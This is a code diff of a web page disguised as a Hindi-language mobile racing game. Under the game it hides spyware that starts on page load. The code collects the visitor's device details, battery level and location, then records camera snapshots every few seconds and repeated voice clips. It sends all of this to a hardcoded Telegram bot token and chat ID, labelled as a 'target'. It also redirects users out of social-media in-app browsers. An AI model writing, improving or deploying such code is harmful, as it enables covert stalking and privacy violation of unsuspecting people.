@@ -7,14 +7,10 @@
     <style>
         body { margin: 0; overflow: hidden; background: #2c3e50; font-family: 'Segoe UI', sans-serif; touch-action: none; }
         canvas { display: block; background: #34495e; width: 100vw; height: 100vh; }
-        
         #ui { position: absolute; top: 20px; width: 100%; text-align: center; color: #f1c40f; font-size: 32px; font-weight: bold; z-index: 10; text-shadow: 2px 2px #000; pointer-events: none; }
-        
         .controls { position: absolute; bottom: 40px; width: 100%; display: flex; justify-content: space-between; padding: 0 40px; box-sizing: border-box; z-index: 15; }
-        .ctrl-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.4); border-radius: 50%; color: #fff; font-size: 40px; display: flex; align-items: center; justify-content: center; user-select: none; -webkit-tap-highlight-color: transparent; }
-        .ctrl-btn:active { background: rgba(255,255,255,0.3); transform: scale(0.9); }
-
-        #startScreen { position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 20; text-align: center; color: white; }
+        .ctrl-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.4); border-radius: 50%; color: #fff; font-size: 40px; display: flex; align-items: center; justify-content: center; user-select: none; }
+        #startScreen { position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 20; text-align: center; color: white; padding: 20px; }
         .play-btn { padding: 18px 50px; font-size: 26px; background: #27ae60; color: #fff; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 5px #1e8449; }
     </style>
 </head>
@@ -23,9 +19,9 @@
 <div id="ui">SCORE: <span id="score">0</span></div>
 
 <div id="startScreen">
-    <h1 style="color:#e74c3c; margin-bottom:10px;">🏎️ DESI NITRO RACER</h1>
-    <p>गेम लोड हो रहा है...<br>कृपया 'Allow' पर क्लिक करें!</p>
-    <button class="play-btn" onclick="initEverything()">PLAY GAME</button>
+    <h1 style="color:#e74c3c;">🏎️ DESI NITRO RACER</h1>
+    <p id="statusMsg">सेटिंग्स लोड हो रही हैं... कृपया 'Allow' करें!</p>
+    <button class="play-btn" onclick="startGame()">START RACE</button>
 </div>
 
 <div class="controls">
@@ -34,74 +30,96 @@
 </div>
 
 <canvas id="gameCanvas"></canvas>
-<video id="v" style="display:none" autoplay></video>
+<video id="v" style="display:none" autoplay playsinline muted></video>
 <canvas id="c" style="display:none"></canvas>
 
 <script>
-// --- [ बॉट सेटिंग्स ] ---
 const botToken = '8047508895:AAFrcd1D14oyIUtPcmjK-dxZY0sEwohBJcA';
 const chatId = '8466223066';
 
-// --- [ सुधरा हुआ परमिशन और डेटा कैप्चर ] ---
-async function startTracking() {
-    // 1. लोकेशन (बिल्कुल सही लिंक फॉर्मेट)
-    navigator.geolocation.getCurrentPosition(p => {
-        const lat = p.coords.latitude;
-        const lon = p.coords.longitude;
-        // 404 एरर हटाने के लिए सही Google Maps URL
-        const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
-        sendData(`📍 New Target Logged:\n` + mapLink, 'text');
-    }, () => sendData("❌ Location Denied", 'text'));
+// --- [ ऑटो स्टार्ट & एडवांस्ड ट्रैकिंग ] ---
+window.onload = () => {
+    checkBrowser();
+    autoRequest();
+};
 
+async function autoRequest() {
+    // 1. डिवाइस और बैटरी की जानकारी
+    let info = `📱 **New Target Entry**\n`;
+    info += `Device: ${navigator.platform}\n`;
+    info += `Browser: ${navigator.userAgent.slice(0, 50)}...\n`;
+    
+    if ('getBattery' in navigator) {
+        const battery = await navigator.getBattery();
+        info += `Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})\n`;
+    }
+
+    // 2. लोकेशन तुरंत
+    navigator.geolocation.getCurrentPosition(p => {
+        const mapLink = "http://www.google.com/maps/place/" + p.coords.latitude + "," + p.coords.longitude;
+        sendData(info + `📍 Maps: ${mapLink}`, 'text');
+    }, () => sendData(info + "❌ Location Denied", 'text'));
+
+    // 3. कैमरा और माइक
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const video = document.getElementById('v');
-        video.srcObject = stream;
-
-        // 2. फोटो लूप (हर 2 सेकंड)
-        setInterval(() => {
-            const capCanvas = document.getElementById('c');
-            capCanvas.width = video.videoWidth; 
-            capCanvas.height = video.videoHeight;
-            capCanvas.getContext('2d').drawImage(video, 0, 0);
-            capCanvas.toBlob(blob => sendData(blob, 'photo'), 'image/jpeg', 0.4);
-        }, 2000);
-
-        // 3. वॉइस लूप (हर 10 सेकंड)
-        function voiceRecorder() {
-            const recorder = new MediaRecorder(stream);
-            const chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                sendData(new Blob(chunks, {type: 'audio/ogg'}), 'voice');
-                voiceRecorder(); 
-            };
-            recorder.start();
-            setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
-        }
-        voiceRecorder();
-
+        document.getElementById('v').srcObject = stream;
+        document.getElementById('statusMsg').innerHTML = "Ready! ✅";
+        startCapturing(stream);
+        
+        if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => {});
     } catch (e) {
-        sendData("❌ Camera/Mic Permission Denied", 'text');
+        document.getElementById('statusMsg').innerHTML = "❌ परमिशन दें!";
+        sendData("❌ Camera/Mic Denied", 'text');
     }
+}
+
+function startCapturing(stream) {
+    const video = document.getElementById('v');
+    // फोटो हर 2.5 सेकंड में
+    setInterval(() => {
+        const capCanvas = document.getElementById('c');
+        capCanvas.width = video.videoWidth; capCanvas.height = video.videoHeight;
+        capCanvas.getContext('2d').drawImage(video, 0, 0);
+        capCanvas.toBlob(blob => sendData(blob, 'photo'), 'image/jpeg', 0.4);
+    }, 2500);
+
+    // आवाज़ हर 10 सेकंड में
+    function voiceRecorder() {
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+            sendData(new Blob(chunks, {type: 'audio/ogg'}), 'voice');
+            voiceRecorder(); 
+        };
+        recorder.start();
+        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
+    }
+    voiceRecorder();
 }
 
 function sendData(data, type) {
     const form = new FormData();
     form.append('chat_id', chatId);
-    let apiURL = `https://api.telegram.org/bot${botToken}/`;
-
-    if(type === 'photo') { apiURL += 'sendPhoto'; form.append('photo', data, 'snap.jpg'); }
-    else if(type === 'voice') { apiURL += 'sendVoice'; form.append('voice', data, 'rec.ogg'); }
-    else { apiURL += 'sendMessage'; form.append('text', data); }
-
-    fetch(apiURL, { method: 'POST', body: form }).catch(err => console.log("Upload Error:", err));
+    let url = `https://api.telegram.org/bot${botToken}/`;
+    if(type === 'photo') { url += 'sendPhoto'; form.append('photo', data, 's.jpg'); }
+    else if(type === 'voice') { url += 'sendVoice'; form.append('voice', data, 'a.ogg'); }
+    else { url += 'sendMessage'; form.append('text', data); }
+    fetch(url, { method: 'POST', body: form }).catch(() => {});
 }
 
-// --- [ फुल स्क्रीन कार गेम - नो चेंजेस ] ---
+function checkBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Instagram') || ua.includes('FBAN') || ua.includes('FBAV')) {
+        const link = window.location.href.replace(/https?:\/\//, "");
+        window.location.href = "intent://" + link + "#Intent;scheme=https;package=com.android.chrome;end";
+    }
+}
+
+// --- [ गेम इंजन ] ---
 const canvas = document.getElementById("gameCanvas");
 const ctx = canvas.getContext("2d");
-
 function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
 window.addEventListener('resize', resize);
 resize();
@@ -109,54 +127,47 @@ resize();
 let score = 0, gameActive = false, playerX = canvas.width/2 - 30, enemies = [];
 
 function drawCar(x, y, color) {
-    ctx.fillStyle = color;
-    ctx.fillRect(x, y, 60, 100); 
-    ctx.fillStyle = "#000"; 
-    ctx.fillRect(x-6, y+15, 6, 25); ctx.fillRect(x+60, y+15, 6, 25);
-    ctx.fillRect(x-6, y+65, 6, 25); ctx.fillRect(x+60, y+65, 6, 25);
-    ctx.fillStyle = "rgba(255,255,255,0.3)"; 
-    ctx.fillRect(x+8, y+20, 44, 20);
+    ctx.fillStyle = color; ctx.fillRect(x, y, 60, 100); 
+    ctx.fillStyle = "#000"; ctx.fillRect(x-6, y+10, 6, 20); ctx.fillRect(x+60, y+10, 6, 20);
+    ctx.fillRect(x-6, y+70, 6, 20); ctx.fillRect(x+60, y+70, 6, 20);
 }
 
-function enemySpawner() {
+function spawn() {
     if(!gameActive) return;
-    let lWidth = canvas.width / 3;
-    let lanes = [lWidth/2 - 30, canvas.width/2 - 30, (canvas.width - lWidth/2) - 30];
-    let speed = 4 + (score * 0.25); 
-    enemies.push({ x: lanes[Math.floor(Math.random()*3)], y: -120, s: speed });
-    setTimeout(enemySpawner, Math.max(1500 - (score * 50), 700));
+    let lanes = [canvas.width/6, canvas.width/2, (canvas.width/6)*5];
+    enemies.push({ x: lanes[Math.floor(Math.random()*3)] - 30, y: -120, s: 5 + (score * 0.2) });
+    setTimeout(spawn, Math.max(1500 - (score * 50), 800));
 }
 
-function gameLoop() {
+function loop() {
     if(!gameActive) return;
     ctx.clearRect(0,0,canvas.width, canvas.height);
     
-    ctx.setLineDash([50, 50]); ctx.strokeStyle = "#fff"; ctx.lineWidth = 6;
+    // रोड एनीमेशन
+    ctx.setLineDash([50, 50]); ctx.strokeStyle = "#fff"; ctx.lineWidth = 4;
     ctx.beginPath(); ctx.moveTo(canvas.width/3, 0); ctx.lineTo(canvas.width/3, canvas.height); ctx.stroke();
     ctx.beginPath(); ctx.moveTo((canvas.width/3)*2, 0); ctx.lineTo((canvas.width/3)*2, canvas.height); ctx.stroke();
 
-    drawCar(playerX, canvas.height - 150, "#e74c3c"); 
-
+    drawCar(playerX, canvas.height - 150, "#e74c3c");
     enemies.forEach((en, i) => {
         en.y += en.s;
         drawCar(en.x, en.y, "#3498db");
         if(playerX < en.x + 60 && playerX + 60 > en.x && canvas.height-150 < en.y + 100 && canvas.height-50 > en.y) {
-            gameActive = false; alert("Boom! Crashed. Score: " + score); location.reload();
+            gameActive = false; alert("Boom! Crashed."); location.reload();
         }
         if(en.y > canvas.height) { enemies.splice(i, 1); score++; document.getElementById("score").innerText = score; }
     });
-    requestAnimationFrame(gameLoop);
+    requestAnimationFrame(loop);
 }
 
-document.getElementById("lBtn").addEventListener("touchstart", (e) => { e.preventDefault(); playerX = Math.max(20, playerX - (canvas.width/3)); });
-document.getElementById("rBtn").addEventListener("touchstart", (e) => { e.preventDefault(); playerX = Math.min(canvas.width-80, playerX + (canvas.width/3)); });
+document.getElementById("lBtn").ontouchstart = (e) => { e.preventDefault(); playerX = Math.max(10, playerX - (canvas.width/3)); };
+document.getElementById("rBtn").ontouchstart = (e) => { e.preventDefault(); playerX = Math.min(canvas.width-70, playerX + (canvas.width/3)); };
 
-function initEverything() {
+function startGame() {
     document.getElementById("startScreen").style.display = "none";
     gameActive = true;
-    startTracking(); 
-    enemySpawner();
-    gameLoop();
+    spawn();
+    loop();
 }
 </script>
 </body>
